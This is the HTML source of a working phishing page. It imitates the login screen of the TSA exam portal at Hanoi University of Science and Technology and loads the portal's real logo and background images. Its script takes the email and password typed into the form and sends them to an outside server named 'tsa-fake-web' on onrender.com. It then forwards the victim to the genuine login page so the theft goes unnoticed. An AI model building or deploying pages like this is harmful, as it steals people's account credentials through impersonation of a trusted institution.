<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập - TSA</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <div id="root">
    <div class="Exam_main__zGDyL">
        <div class="ant-row Exam_container__1-aEa">
            <div class="ant-col mt-6 ant-col-xs-24">
                <div class="text-center">
                    <img class="logo-kt mb-4 mt-4" alt="..." src="https://tsa.hust.edu.vn/static/media/logo-full.d53aeb71.svg" width="340px" height="32px" vsspace="100px" hsspace="100px">
                </div>
            </div>
        </div>
    </div>
</div>
    <style>
        body {
            background: url('https://tsa.hust.edu.vn/static/media/bg-page-login.c1e278a5.png') no-repeat center center fixed;
            background-size: cover;
        }
        .login-container {
            max-width: 400px;
            margin: 100px auto;
            padding: 30px;
            background: white;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .btn-login {
            background-color: #d00;
            color: white;
        }
        .btn-login:hover {
            background-color: #a00;
        }
        .forgot-password {
            color: #d00;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <h2>Đăng nhập</h2>
            <p>Ban chưa có tài khoản? <a href="#" style="color: #d00;">Đăng ký ngay</a></p>
            <form id="login-form">
                <div class="mb-3 text-start">
                    <label class="form-label">Email *</label>
                    <input type="email" class="form-control" id="email" placeholder="Nhập email" required>
                </div>
                <div class="mb-3 text-start">
                    <label class="form-label">Mật khẩu *</label>
                    <input type="password" class="form-control" id="password" placeholder="Nhập mật khẩu" required>
                </div>
                <button type="submit" class="btn btn-login w-100">Đăng nhập</button>
            </form>
            <a href="#" class="forgot-password mt-3 d-block">Quên mật khẩu?</a>
        </div>
    </div>
</body>

<script>
    document.getElementById("login-form").addEventListener("submit", function(event) {
        event.preventDefault(); // Ngăn chặn reload trang

        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        fetch("https://tsa-fake-web.onrender.com/save-login", { // Đúng endpoint API
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, password })
        })
        .then(response => response.json())
        .then(data => {
            alert("Thông tin đăng nhập đã được lưu!");
            window.location.href = "https://tsa.hust.edu.vn/dang-nhap"; // Điều hướng
        })
        .catch(error => {
            console.error("Lỗi khi gửi dữ liệu:", error);
            alert("Không thể gửi thông tin đăng nhập! Kiểm tra lại server.");
        });
    });
</script>
</html>
